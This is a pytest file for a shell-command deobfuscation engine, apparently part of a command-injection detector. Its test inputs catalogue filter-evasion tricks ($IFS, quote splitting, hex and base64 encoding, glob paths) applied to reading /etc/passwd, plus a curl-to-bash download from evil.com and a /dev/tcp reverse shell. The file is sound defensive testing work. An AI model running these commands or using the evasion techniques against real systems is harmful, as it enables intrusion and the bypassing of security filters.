import pytest
from app.core.pipeline.normalizer import DeobfuscationEngine

@pytest.fixture
def engine():
    return DeobfuscationEngine()

def test_lexical_quote_flattening(engine):
    assert engine.normalize("w'h'o'am'i") == "whoami"
    assert engine.normalize('"c""a""t"') == "cat"
    assert engine.normalize(r"\c\a\t") == "cat"

def test_ansic_quoting(engine):
    assert engine.normalize("printf $'\\x77\\x68\\x6f\\x61\\x6d\\x69'") == "printf whoami"
    assert engine.normalize(r"printf '\x77\x68\x6f\x61\x6d\x69'") == "printf whoami"

def test_whitespace_and_ifs(engine):
    assert engine.normalize("cat$IFS/etc/passwd") == "cat /etc/passwd"
    assert engine.normalize("cat$IFS/e?c/p*sswd") == "cat /etc/passwd"
    assert engine.normalize("cat${IFS}/etc/passwd") == "cat /etc/passwd"

def test_redirections(engine):
    assert engine.normalize("cat</etc/passwd") == "cat < /etc/passwd"
    assert engine.normalize("echo>file") == "echo > file"

def test_brace_expansion(engine):
    assert engine.normalize("{cat,/etc/passwd}") == "cat /etc/passwd"

def test_symbolic_variables(engine):
    assert engine.normalize('a="cat"; b="/etc/passwd"; $a $b') == "cat /etc/passwd"
    assert engine.normalize("cat$u /etc$u/passwd") == "cat /etc/passwd"

def test_decoding_pipeline(engine):
    assert engine.normalize('echo "d2hvYW1p" | base64 -d') == "whoami"
    assert engine.normalize('$(echo "imaohw" | rev)') in ("whoami", "$(whoami)")

def test_path_and_glob_canonicalization(engine):
    assert engine.normalize("/b?n/c?t /etc/passwd") == "/bin/cat /etc/passwd"
    assert engine.normalize("/b?n/w?oami") == "/bin/whoami"
    assert engine.normalize("/bin/../bin//whoami") == "/bin/whoami"
    assert engine.normalize("/usr/bin/p*th*n") == "/usr/bin/python"

def test_wrapper_unnesting(engine):
    assert engine.normalize('eval "echo foo"') == "echo foo"
    assert engine.normalize('sh -c "whoami"') == "whoami"
    assert engine.normalize('bash -c "whoami"') == "whoami"

def test_dynamic_evasion_fallback(engine):
    cmd1 = engine.normalize("curl http://evil.com/x.sh | bash")
    assert "UNRESOLVABLE_DYNAMIC_OBFUSCATION" in cmd1
    assert engine.unresolvable is True

    cmd2 = engine.normalize("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
    assert "UNRESOLVABLE_DYNAMIC_OBFUSCATION" in cmd2
    assert engine.unresolvable is True
